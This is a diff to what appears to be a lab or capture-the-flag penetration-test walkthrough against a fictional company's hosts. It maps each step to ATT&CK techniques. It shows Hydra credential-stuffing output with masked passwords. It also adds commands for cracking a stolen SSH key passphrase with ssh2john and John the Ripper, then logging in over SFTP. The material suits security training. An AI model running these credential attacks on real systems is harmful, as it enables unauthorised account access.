@@ -89,7 +89,7 @@ What can we do:
 |-----------------------------|-------------------------------|-----------------------------|
 | [T1078](https://attack.mitre.org/techniques/T1078/)    | Valid Accounts    |  Hydra, SSH  |
 | [T1110](https://attack.mitre.org/techniques/T1110/004/)   |  Credential Stuffing   |  Hydra   |
-| [T1110](https://attack.mitre.org/techniques/T1110/002/)   | Password Cracking   | ssh2john, john/hashcat  |
+
 
 ### Crafting the Credential Stuffing Attack
 Make a users.txt list which reflects the naming convention found on the SSH Banner:  
@@ -128,8 +128,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 119 login tries (l:17/p:7), ~8 tries per task
 [DATA] attacking ssh://10.10.43.128:22/
-[22][ssh] host: 10.10.43.128   login: j_moore   password: __________
-[22][ssh] host: 10.10.43.128   login: m_brown   password: __________
+[22][ssh] host: 10.10.43.128   login: j_moore   password: **********
+[22][ssh] host: 10.10.43.128   login: m_brown   password: **********
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:07
 ```
@@ -149,7 +149,10 @@ ssh m_brown@$ip
 |-----------------------------|-------------------------------|-----------------------------|
 | [T1021](https://attack.mitre.org/techniques/T1021/004/)    | Remote Services    | SSH    |
 | [T1552](https://attack.mitre.org/techniques/T1552/)    | Unsecured Credentials    | Manual Enumeration / LinPEAS.sh    |
+| [T1110](https://attack.mitre.org/techniques/T1110/002/)   | Password Cracking   | ssh2john, john/hashcat  |
 | [T1110](https://attack.mitre.org/techniques/T1110/003/)    | Password Spraying    | NMAP Scripting Engine    |
+
+
 
 ### Internal Recon and Enumeration with LinPEAS
 Transfer Linpeas to the target computer and run the script using j_moore's profile.
@@ -188,7 +191,68 @@ What can we do:
 - Test j_moore's private key against sftp service
 - Conduct a SSH Key Spray
   
-### j_moore lateral Move to SFTP
+### j_moore, lateral Move to SFTP
+Log into the sftp service using j_moore's id_rsa:
+```bash
+sftp -i id_rsa sftp@$ip
+```
+```bash
+The authenticity of host '10.10.64.168 (10.10.64.168)' can't be established.
+ED25519 key fingerprint is SHA256:RPye4zEVR50BH+C2h4qT0zFRbYVknKzA3S/aP0fddoc.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.64.168' (ED25519) to the list of known hosts.
+
+**************************************************************************
+*                           Nexora Solutions                             *
+*                    Secure Shell (SSH) Access Portal                    *
+**************************************************************************
+
+NOTICE: This system is for authorized use only. Unauthorized access or use 
+is prohibited and may result in disciplinary action and/or civil and 
+criminal penalties. All activities on this system are monitored and 
+recorded. 
+
+For assistance, contact:
+  support@nexora-solutions.com
+  j_davis@nexora-solutions.com
+
+Enter passphrase for key 'id_rsa': 
+```
+Before we can log into the sftp service, we will need to crack the passphrase
+associated to the id_rsa key.  
+
+#### cracking ssh passphrases
+Step 1: Transfer j_moore's id_rsa to the attack computer.  
+Step 2: Utilize ssh2john to output a hash format for John/Hashcat to crack against.
+```bash
+ssh2john id_rsa_moore > moore.hash
+```
+Step 3: Use John or Hashcat to crack the hash (assuming it is a weak password). 
+```bash
+john moore.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+```bash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+********         (id_rsa_moore)     
+1g 0:00:00:08 DONE (2025-01-06 01:08) 0.1194g/s 40.14p/s 40.14c/s 40.14C/s nicholas..olivia
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+With the id_rsa passphrase, we can now test j_moore's id_rsa agains the sftp service.
+```bash
+sftp -i id_rsa sftp@$ip
+```
+```bash
+Enter passphrase for key 'id_rsa': 
+Connected to 10.10.64.168.
+sftp> 
+```
 
 ### j_moore Lateral Move to net-admin
 Recon of the internal environment provides a likely attack path:  
